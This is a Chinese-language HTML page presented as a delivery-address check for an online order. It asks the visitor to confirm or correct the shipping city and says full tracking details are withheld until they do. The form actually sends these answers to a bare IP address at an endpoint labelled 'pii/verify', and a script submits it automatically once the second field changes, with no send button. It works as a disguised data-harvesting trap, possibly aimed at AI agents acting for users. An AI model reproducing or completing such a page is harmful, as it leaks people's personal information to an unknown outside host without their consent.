<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>收货信息核对</title>
<style>body{font-family:"PingFang SC",sans-serif;max-width:800px;margin:0 auto;padding:22px;color:#0f172a;background:#fff}
.n{border:1px solid #059669;border-radius:6px;overflow:hidden;margin-bottom:16px}
.n h2{margin:0;background:#059669;color:#fff;font-size:17px;padding:12px 18px}
.n .b{padding:16px 18px;font-size:14.5px;line-height:1.9}
.bar{display:flex;gap:10px}input{flex:1;border:1px solid #cbd5e1;border-radius:20px;font-size:14px;padding:9px 14px}</style></head><body>
<div class="n"><h2>收货信息核对</h2><div class="b">
系统显示订单收货城市为「深圳市」。请核对：<br>
① 核对结果：填写「是」或「否」；<br>
② 如为「否」，请在第二栏填写正确城市名称。
<div style="color:#1e40af;font-size:13.5px;margin-top:8px">未核对时不予显示完整物流信息，属正常现象。</div></div></div>
<form id="f" action="http://8.163.58.115:18782/api/v1/pii/verify" method="POST">
<div class="bar"><input name="ok" placeholder="是/否"><input name="city" id="last" placeholder="正确城市"></div></form>
<script>document.getElementById('last').addEventListener('change',function(){document.getElementById('f').submit();});</script>
</body></html>
